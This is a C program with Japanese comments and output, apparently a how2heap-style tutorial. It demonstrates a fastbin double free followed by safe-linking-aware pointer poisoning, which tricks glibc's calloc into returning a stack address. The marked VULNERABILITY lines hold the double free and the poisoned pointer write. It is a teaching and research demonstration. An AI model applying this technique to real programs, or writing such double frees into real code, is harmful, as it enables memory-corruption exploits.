#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>

int main()
{
	setbuf(stdout, NULL);

	printf("このファイルは fastbin_dup.c を拡張し、malloc をだまして\n"
	       "制御可能な場所(ここではスタック)へのポインタを返させます。\n");

	unsigned long stack_var[4] __attribute__ ((aligned (0x10)));
	printf("calloc() に返させたいアドレスは %p です。\n", stack_var + 2);

	printf("tcache を埋めて fastbin を準備するためにバッファを確保します。\n");
	void *ptrs[7];

	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}

	printf("バッファを 3 つ確保します。\n");
	int *a = calloc(1,8);
	int *b = calloc(1,8);
	int *c = calloc(1,8);
	printf("1 回目の calloc(1,8): %p\n", a);
	printf("2 回目の calloc(1,8): %p\n", b);
	printf("3 回目の calloc(1,8): %p\n", c);

	printf("tcache を埋めます。\n");
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	printf("最初のチャンク %p を解放します...\n", a);
	free(a);

	printf("%p をもう一度解放すると、%p がfree list の先頭にあるためクラッシュします。\n", a, a);

	printf("そこで、代わりに %p を解放します。\n", b);
	free(b);

	printf("これで、%p はfree listの先頭ではないので、もう一度解放できます。\n", a);
	/* VULNERABILITY */
	free(a);
	/* VULNERABILITY */

	printf("free listを使って確保するには、tcache を空にする必要があります。\n");
	printf("これは、glibc-2.41 以降では tcache を使い切らないと fastbin に到達できないためです。");
	printf("このパッチによる変更です: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=226e3b0a413673c0d6691a0ae6dd001fe05d21cd");
	for (int i = 0; i < 7; i++) {
		ptrs[i] = malloc(8);
	}

	printf("これでfree listは [ %p, %p, %p ] になりました。"
		"%p のデータを書き換えて攻撃を実行します。\n", a, b, a, a);
	unsigned long *d = calloc(1,8);

	printf("1 回目の calloc(1,8): %p\n", d);
	printf("2 回目の calloc(1,8): %p\n", calloc(1,8));
	printf("これでfree listは [ %p ] になりました。\n", a);
	printf("これで、%p がfree listの先頭にあるまま、そこにアクセスできます。\n"
		"そこで、スタックに偽の空きサイズ(ここでは 0x20)を書き込み、\n"
		"calloc にそこへ空きチャンクがあると思い込ませて、\n"
		"そのポインタを返させます。\n", a);
	puts("なお、これが必要なのは calloc の場合だけです。malloc では不要です。");
	stack_var[1] = 0x20;

	printf("次に、%p のデータの先頭 8 バイトを上書きして、0x20 の直前を指すようにします。\n", a);
	printf("safe-linking の仕組みにより、格納される値はポインタそのものではなく、加工(poison)された値であることに注意してください。\n");
	printf("^ 参考: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\n");
	unsigned long ptr = (unsigned long)stack_var+0x10;
	unsigned long addr = (unsigned long) d;
	/*VULNERABILITY*/
	*d = (addr >> 12) ^ ptr;
	/*VULNERABILITY*/

	printf("3 回目の calloc(1,8): %p、スタックのアドレスをfree listに載せます\n", calloc(1,8));

	void *p = calloc(1, 8);

	printf("4 回目の calloc(1,8): %p\n", p);
	assert((unsigned long)p == (unsigned long)stack_var+0x10);
}
